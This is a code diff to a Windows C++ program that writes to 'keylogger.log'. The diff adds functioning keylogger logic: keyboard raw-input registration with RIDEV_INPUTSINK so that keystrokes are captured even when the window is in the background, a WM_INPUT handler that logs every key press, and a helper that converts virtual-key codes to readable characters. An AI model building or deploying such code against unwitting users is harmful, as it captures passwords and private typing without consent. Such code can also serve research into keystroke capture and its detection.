@@ -18,6 +18,34 @@ DEFINE_GUID(GUID_DEVINTERFACE_KEYBOARD,
 std::wofstream logFile("keylogger.log", std::ios::app);
 std::vector<PWSTR> keyboardDevicePaths;
 
+std::wstring VKeyToWString(DWORD vkey) {
+    BYTE keyboardState[256] = {0};
+    WCHAR buffer[16];
+    HKL layout = GetKeyboardLayout(0);
+
+    // Get the scan code
+    UINT scanCode = MapVirtualKeyEx(vkey, MAPVK_VK_TO_VSC, layout);
+
+    // Get key name text (for special keys like arrows, function keys, etc.)
+    if ((vkey >= VK_LEFT && vkey <= VK_DOWN) || (vkey >= VK_F1 && vkey <= VK_F24)) {
+        LONG lParam = (scanCode << 16);
+        int result = GetKeyNameTextW(lParam, buffer, sizeof(buffer) / sizeof(WCHAR));
+        if (result > 0) {
+            return std::wstring(buffer);
+        }
+    }
+
+    // Try to translate to a character (for alphanumeric keys)
+    if (ToUnicodeEx(vkey, scanCode, keyboardState, buffer, sizeof(buffer) / sizeof(WCHAR), 0, layout) > 0) {
+        return std::wstring(buffer);
+    }
+
+    // Fallback: return hex code
+    wchar_t fallback[10];
+    swprintf(fallback, 10, L"[0x%X]", vkey);
+    return std::wstring(fallback);
+}
+
 void LogMessage(const std::wstring& message) {
     // flush to make sure message is written immediately
     logFile << message << std::endl;
@@ -58,6 +86,20 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             EndPaint(hwnd, &ps);
             return 0;
         }
+        case WM_INPUT: {
+            UINT dwSize = 0;
+            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
+            LPBYTE lpb = new BYTE[dwSize];
+            if (!lpb) { return 0; }
+            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize) {
+                RAWINPUT* raw = (RAWINPUT*)lpb;
+                if (raw->header.dwType == RIM_TYPEKEYBOARD) {
+                    LogMessage(L"Key Pressed: " + VKeyToWString(raw->data.keyboard.VKey));
+                }
+            }
+            delete[] lpb;
+            return 0;
+        }
     }
     return DefWindowProc(hwnd, uMsg, wParam, lParam);
 }
@@ -90,6 +132,17 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
         return 1;
     }
     ShowWindow(hwnd, nCmdShow);
+    // register raw input from keyboards
+    LogMessage(L"Registering raw input");
+    RAWINPUTDEVICE rid[1];
+    rid[0].usUsagePage = 0x01; // generic desktop controls
+    rid[0].usUsage = 0x06; // keyboard
+    rid[0].dwFlags = RIDEV_INPUTSINK | RIDEV_DEVNOTIFY; // receive input even when not in foreground
+    rid[0].hwndTarget = hwnd;
+    if (!RegisterRawInputDevices(rid, 1, sizeof(rid[0]))) {
+        MessageBox(NULL, L"Failed to register raw input devices!", L"Error", MB_OK);
+        return 1;
+    }
     // message loop
     LogMessage(L"Entering message loop");
     MSG msg = { };
